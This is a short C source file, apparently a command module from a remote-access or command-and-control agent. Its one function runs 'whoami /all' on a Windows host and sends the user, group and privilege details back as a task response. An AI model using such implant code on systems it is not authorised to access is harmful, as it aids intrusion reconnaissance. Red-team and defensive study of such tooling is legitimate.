#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdlib.h>

#ifdef INCLUDE_CMD_WHOAMI

void command_whoami(char *task_id, char *params) {
  (void)params;
  char *output = execute_shell("whoami /all");
  send_task_response(task_id, output);
  if (output)
    free(output);
}

#endif
